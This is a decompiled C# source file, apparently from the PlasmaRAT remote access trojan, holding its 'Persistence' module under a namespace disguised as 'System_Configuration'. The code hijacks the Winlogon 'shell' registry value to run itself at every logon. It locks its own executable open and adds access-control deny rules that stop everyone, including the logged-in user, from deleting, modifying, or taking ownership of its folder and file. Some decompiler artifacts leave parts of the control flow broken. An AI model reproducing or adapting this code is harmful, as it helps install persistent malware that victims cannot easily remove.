using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace System_Configuration
{
	// Token: 0x02000021 RID: 33
	[StandardModule]
	internal sealed class Persistence
	{
		// Token: 0x060000D4 RID: 212 RVA: 0x0000C190 File Offset: 0x0000A390
		[MethodImpl(MethodImplOptions.NoOptimization)]
		public static void Startup()
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				Persistence.ProtectFolder(PlasmaRAT.InstallationOfEverything);
				IL_13:
				num2 = 3;
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", true);
				IL_26:
				num2 = 4;
				registryKey.SetValue("shell", "explorer.exe,\"" + Application.ExecutablePath + "\"");
				IL_47:
				num2 = 5;
				registryKey.Close();
				IL_4F:
				num2 = 6;
				if (Persistence.WriteKey)
				{
					goto IL_7E;
				}
				IL_58:
				num2 = 7;
				Persistence.WriteKey = true;
				IL_60:
				num2 = 8;
				Thread.Sleep(1000);
				IL_6C:
				num2 = 9;
				FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite, -1);
				IL_7E:
				num2 = 11;
				Persistence.ProtectTheFile(Application.ExecutablePath);
				IL_8B:
				goto IL_10A;
				IL_8D:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_CB:
				goto IL_FF;
				IL_CD:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_DD:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_CD;
			}
			IL_FF:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_10A:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x0000C2C0 File Offset: 0x0000A4C0
		public static void AllowAccess(string location)
		{
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(location);
				DirectorySecurity directorySecurity = new DirectorySecurity();
				directorySecurity.SetAccessRuleProtection(false, true);
				directoryInfo.SetAccessControl(directorySecurity);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x0000C30C File Offset: 0x0000A50C
		public static void ProtectFolder(string location)
		{
			try
			{
				string identity = "EVERYONE";
				DirectoryInfo directoryInfo = new DirectoryInfo(location);
				DirectorySecurity directorySecurity = new DirectorySecurity();
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ReadAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.AppendData, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.DeleteSubdirectoriesAndFiles, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.SetAccessRuleProtection(false, true);
				directoryInfo.SetAccessControl(directorySecurity);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x0000C3F4 File Offset: 0x0000A5F4
		public static void ProtectTheFile(string location)
		{
			try
			{
				string identity = Environment.UserName.ToString();
				DirectoryInfo directoryInfo = new DirectoryInfo(location);
				DirectorySecurity directorySecurity = new DirectorySecurity();
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.Read, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ReadAndExecute, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.Write, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ReadData, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
				directoryInfo.SetAccessControl(directorySecurity);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0400008D RID: 141
		private static bool WriteKey = false;
	}
}
